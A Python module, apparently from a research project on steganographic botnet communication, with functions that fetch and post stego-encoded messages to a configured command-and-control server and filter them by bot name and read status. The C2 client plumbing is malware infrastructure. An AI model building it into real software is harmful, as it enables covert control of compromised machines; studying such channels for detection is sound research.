import shared_modules.crypto as cryptoModule
import requests
import json
from loguru import logger

#Import the C2 configuration
with open('./code/conf/c2.conf', 'r') as configFile: c2Config = json.load(configFile)

#For storing hashes of messages that have been read.
processedMessageHashes = []

#Function to retrieves (get) the c2 from the command and control server.
#This is only for research purpose so ther is no api security/authentication.
def get():
    c2URL = c2Config["c2URL"]
    response = requests.get(url=c2URL)
    if response.status_code == 200:
        c2Response = response.json().get('messages')
    else:
        c2Response = ""
    return c2Response

#Function to push (post) the created stegotext to a command and control server.
#This is only for research purpose so ther is no api security/authentication.
def push(stegoText: str):
    c2URL = c2Config["c2URL"]
    c2Message = {"message": stegoText}
    requests.post(url=c2URL, json=c2Message)
    return True

def filterMessagesForMe(c2Messages: list, botName: str):
    filteredMessages = [message for message in c2Messages if botName.upper() in message.upper()]
    return filteredMessages

def filterUnreadMessages(c2Messages: list):
    filteredMessages = [message for message in c2Messages if cryptoModule.getMessageHash(message) not in processedMessageHashes]
    for message in filteredMessages: processedMessageHashes.append(cryptoModule.getMessageHash(message))
    return filteredMessages